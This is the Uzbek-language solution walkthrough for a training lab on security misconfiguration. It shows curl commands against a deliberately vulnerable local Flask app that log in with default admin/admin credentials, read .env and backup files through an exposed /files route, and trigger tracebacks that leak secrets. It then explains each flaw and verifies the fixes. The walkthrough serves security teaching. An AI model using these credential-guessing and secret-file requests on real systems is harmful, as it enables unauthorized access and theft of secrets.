🌐 [English](./SOLUTION.md) · [Русский](./SOLUTION.ru.md) · **Oʻzbekcha**

# A02 — Yechim (spoylerlar!)

Avval [README](./README.uz.md) dagi maslahatlardan foydalanib, laboratoriyani oʻzingiz bajarib koʻring.

## vulnerable da ekspluatatsiya (port 8011)

```bash
# 1. Sukut boʻyicha hisob yozuvi. Brauzerda: xodimlar formasi
#    http://127.0.0.1:8011/admin manzilida
curl -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}' http://127.0.0.1:8011/login
# → FLAG{a02_default_credentials}
# Brauzerdagi bir xil kirish kafe panelini flag bilan ochadi.

# 2. /files marshruti ilova papkasidagi istalgan faylni beradi
curl http://127.0.0.1:8011/files/.env          # → FLAG{a02_exposed_env_file}
curl http://127.0.0.1:8011/files/backup.sql    # → FLAG{a02_forgotten_backup}
curl http://127.0.0.1:8011/files/app.py        # → manba kodi, shablonlar, .env

# 3. Batafsil xato: trassirovka va ilova konfiguratsiyasi
curl "http://127.0.0.1:8011/menu/abc"
# → 500, "traceback" va "config" (DB_URL, SECRET_KEY = FLAG{a02_verbose_errors})
# Brauzerda shu soʻrov trassirovka va konfiguratsiya bilan xato sahifasini koʻrsatadi.

# 4. Sarlavhalar
curl -i http://127.0.0.1:8011/
# bor:   X-Powered-By (Flask/Python versiyalari), Server: Werkzeug/...
# yoʻq:  X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, Referrer-Policy
```

## Xatolar nimada

| № | Xato | Nimasi bilan xavfli |
|---|------|---------------------|
| 1 | `admin` / `admin` paroli | Odatiy juftliklarni biladigan har kim kafe paneliga kira oladi |
| 2 | `/files/<nom>` ilova ildizini beradi | `.env`, zaxira nusxalar va manba kodi oqib chiqadi |
| 3 | Xatolar ishlovchisi trassirovka va konfiguratsiyani koʻrsatadi | Ilova tuzilishi va sirlarni oshkor qiladi |
| 4 | Himoya sarlavhalari yoʻq, versiyalar banneri bor | Hujumlarni (clickjacking, MIME sniffing) va razvedkani yengillashtiradi |

## Tuzatishlar (fixed, port 8012)

- Parol `ADMIN_PASSWORD` dan olinadi; berilmagan boʻlsa, tasodifiy generatsiya qilinadi
- `/files` marshruti olib tashlangan; tashqariga faqat `static/` papkasi beriladi
- Yagona xatolar ishlovchisi: foydalanuvchiga neytral sahifa yoki `error_id`, tafsilotlar faqat logga
- `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Referrer-Policy` sarlavhalari bor, `X-Powered-By` yoʻq
- Raqam boʻlmagan taom raqami oddiy kiritish xatosi (`400`) sifatida qayta ishlanadi, ilovani qulatmaydi

fixed da tekshirish:

```bash
curl http://127.0.0.1:8012/files/.env           # 404
curl "http://127.0.0.1:8012/menu/abc"           # 400, trassirovkasiz
curl -i http://127.0.0.1:8012/                  # himoya sarlavhalari joyida
curl -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}' http://127.0.0.1:8012/login   # 401
# saytning oʻzi ishlashda davom etadi: / , /menu , /menu/4 , /admin
```

## Yana nimani esda tutish kerak
- Real tizimlarda sirlar logga yozilmaydi: laboratoriyada parol faqat qulaylik uchun logga chiqariladi.
- Konfiguratsiyani avtomatik ravishda va har bir relizda tekshirish kerak, bir marta emas.
- Saytning mehmonlar uchun qulayligi va xavfsiz konfiguratsiya — bu ikki xil vazifa, ikkalasini ham bajarish kerak.
